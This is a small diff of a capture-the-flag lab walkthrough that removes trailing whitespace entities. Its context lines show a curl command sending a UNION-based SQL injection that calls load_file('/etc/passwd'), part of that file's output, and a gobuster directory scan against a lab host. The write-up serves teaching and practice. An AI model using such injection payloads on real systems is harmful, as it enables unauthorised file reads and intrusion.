@@ -22,7 +22,7 @@ This reveals a simple website that takes one user input:
 
 <figure><img src="../../../.gitbook/assets/image (4005).png" alt=""><figcaption></figcaption></figure>
 
-If we enter anything, it says that we are eligible to compete in the tournament and gives us a link to `challenge.php`.&#x20;
+If we enter anything, it says that we are eligible to compete in the tournament and gives us a link to `challenge.php`.
 
 <figure><img src="../../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>
 
@@ -57,7 +57,7 @@ Once we submit the flag, we have SSH access, but we still have no password.
 
 ### SSH Creds
 
-Since we still had UNION injection, we can use the `load_file` function to have LFI.&#x20;
+Since we still had UNION injection, we can use the `load_file` function to have LFI.
 
 ```
 $ curl -X POST http://10.129.96.75/ -d "player=user' union select load_file('/etc/passwd'); -- -"
@@ -69,7 +69,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
 <TRUNCATED>
 ```
 
-First we need to identify what files are present on the site. I know that it is PHP-based, so let's start there.&#x20;
+First we need to identify what files are present on the site. I know that it is PHP-based, so let's start there.
 
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.96.75 -x php -t 100
